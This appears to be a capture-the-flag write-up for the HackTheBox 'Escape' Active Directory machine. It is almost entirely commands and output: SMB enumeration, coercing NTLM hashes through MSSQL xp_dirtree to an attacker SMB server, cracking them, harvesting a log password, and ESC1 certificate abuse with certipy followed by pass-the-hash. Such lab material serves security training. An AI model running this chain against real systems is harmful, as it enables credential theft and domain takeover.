### ESCAPE

```bash
 nmap -p- -sSVC --min-rate 5000 10.10.11.202 -Pn -nvvvv -oN allPorts

```

```bash
crackmapexec smb 10.10.11.202                                            
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
 crackmapexec smb 10.10.11.202 -u 'guest' -p '' --shares
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\guest: 

SMB         10.10.11.202    445    DC               Share           Permissions     Remark
SMB         10.10.11.202    445    DC               -----           -----------     ------
SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.202    445    DC               C$                              Default share
SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.202    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.202    445    DC               Public          READ            
SMB         10.10.11.202    445    DC               SYSVOL                          Logon server share
```

```bash
smbmap -H 10.10.11.202 -u guest -p '' -r Public
Public                                                  READ ONLY
        ./Public
        dr--r--r--                0 Sat Nov 19 12:51:25 2022    .
        dr--r--r--                0 Sat Nov 19 12:51:25 2022    ..
        fr--r--r--            49551 Sat Nov 19 12:51:25 2022    SQL Server Procedures.pdf

smbmap -H 10.10.11.202 -u guest -p '' --download  Public/'SQL Server Procedures.pdf'       
```

```bash
impacket-lookupsid sequel.htb/guest@10.10.11.202 -no-pass
517: sequel\Cert Publishers (SidTypeAlias) <-------

impacket-lookupsid sequel.htb/guest@10.10.11.202 -no-pass | grep -i sidtypeuser | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users
Administrator
Guest
krbtgt
DC$
Tom.Henn
Brandon.Brown
Ryan.Cooper
sql_svc
James.Roberts
Nicole.Thompson

```

```bash
impacket-GetNPUsers -no-pass -usersfile users sequel.htb/  
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Tom.Henn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Brandon.Brown doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Ryan.Cooper doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sql_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User James.Roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Nicole.Thompson doesn't have UF_DONT_REQUIRE_PREAUTH set

```

```bash
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM

user PublicUser and password GuestUserCantWrite1  in the PDF
```


```bash
 impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202

 QL (PublicUser  guest@master)> xp_cmdshell "whoami"
ERROR(DC\SQLMOCK): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
SQL (PublicUser  guest@master)> sp_configure "show advanced options",1 
ERROR(DC\SQLMOCK): Line 105: User does not have permission to perform this action.
```


```bash
impacket-smbserver share . -smb2support
//
sudo responder -I tun0 -v

SQL (PublicUser  guest@master)> master.sys.xp_dirtree '\\10.10.14.17\share'
*] sql_svc::sequel:aaaaaaaaaaaaaaaa:17566becf051f3bda2f2537a7a79c4a9:0101000000000000004a13d394bcdb015496aeb462fbef0b00000000010010004900500058004f004900700049004300030010004900500058004f004900700049004300020010004e0041004a00660055004b006f004700040010004e0041004a00660055004b006f00470007000800004a13d394bcdb0106000400020000000800300030000000000000000000000000300000ac045dca38f6aea0683bc5b0c8958e7c6f77e7b51a2d49c3ff10e66b6fbb68dd0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310037000000000000000000
//
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:cbed89a6530cb14d:72D5CBCC70575629FBB48DE96F552308:0101000000000000804AE2E5A5BCDB012647C4E8E4E6C08700000000020008005A0031004B00510001001E00570049004E002D004700410042003600380055004100510049003900340004003400570049004E002D00470041004200360038005500410051004900390034002E005A0031004B0051002E004C004F00430041004C00030014005A0031004B0051002E004C004F00430041004C00050014005A0031004B0051002E004C004F00430041004C0007000800804AE2E5A5BCDB0106000400020000000800300030000000000000000000000000300000AC045DCA38F6AEA0683BC5B0C8958E7C6F77E7B51A2D49C3FF10E66B6FBB68DD0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310037000000000000000000

```
```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
REGGIE1234ronnie (sql_svc)
```


```bash
crackmapexec winrm  10.10.11.202 -u sql_svc  -p 'REGGIE1234ronnie'
WINRM       10.10.11.202    5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
```


```bash
*Evil-WinRM* PS C:\SQLServer\Logs> Select-String -Path ERRORLOG.BAK -Pattern "Password"

ERRORLOG.BAK:70:2022-11-18 13:43:06.75 spid18s     Password policy update was successful.
ERRORLOG.BAK:112:2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
ERRORLOG.BAK:114:2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```

```bash
crackmapexec winrm 10.10.11.202 -u ryan.cooper -p NuclearMosquito3

WINRM       10.10.11.202    5985   DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 (Pwn3d!)

```

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> type user.txt
baab465b6827c9d086a498ba6d9e9278
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

```bash
bloodhound -> ryan(memberOf) -> CERTIFICATE SERVICE DCOM ACCESS

certipy find -vulnerable -u ryan.cooper -p NuclearMosquito3 -dc-ip 10.10.11.202

cat 20250504040832_Certipy.json| jq
"Enrollment Rights": [
            "SEQUEL.HTB\\Domain Admins",
            "SEQUEL.HTB\\Domain Users",
            "SEQUEL.HTB\\Enterprise Admins"
          ]
"[!] Vulnerabilities": {
        "ESC1": "'SEQUEL.HTB\\\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication"
```

```bash
certipy req  -u ryan.cooper -p 'NuclearMosquito3' -ca sequel-DC-CA -template UserAuthentication -upn administrator@sequel.htb -dc-ip 10.10.11.202 -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.202[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.202[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 15
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'

```

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.202
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee

```

```bash
evil-winrm -i 10.10.11.202 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
9fdbdeef5356d2748787f552263ae25e

```
